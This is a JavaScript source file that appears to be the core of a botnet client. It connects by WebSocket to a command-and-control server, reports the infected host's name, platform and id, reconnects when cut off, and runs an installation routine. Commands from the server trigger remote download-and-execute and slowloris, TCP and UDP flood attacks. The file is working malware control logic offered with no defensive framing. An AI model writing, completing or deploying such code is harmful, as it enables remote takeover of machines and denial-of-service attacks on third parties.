const { WebSocket } = require("ws");
const config = require("./config");
const identification = require("./core/identification");
const installation = require('./core/installation');
const commands = require("./commands");

let ws = {};
let canClose = false;

function parseCommand(command) {
  if (command === "quit") {
    canClose = true;
    ws.close(1000, "noooooooo...");
  } else if (command.includes("rde http")) {
    commands.downloadExecute(command);
  } else if (command.includes("slowloris")) {
    commands.ddos.slowloris(command);
  } else if (command.includes("tcp")) {
    commands.ddos.tcpFlood(command);
  } else if (command.includes("udp")) {
    commands.ddos.udpFlood(command);
  }
}

function connect() {
  ws = new WebSocket(`ws://${config.ip}:${config.port}/`);

  ws.on("open", () => {
    console.log("open");
    ws.send(
      `identification ${identification.name} ${identification.platform} ${identification.id}`
    );
  });

  ws.on("message", (data) => {
    parseCommand(data.toString());
  });

  ws.on("error", (error) => {
    console.log("error", error);
  });

  ws.on("close", () => {
    console.log("close");
    reconnect();
  });
}

function reconnect() {
  if (canClose === false) {
    setTimeout(connect, 10000);
  }
}

connect();
installation();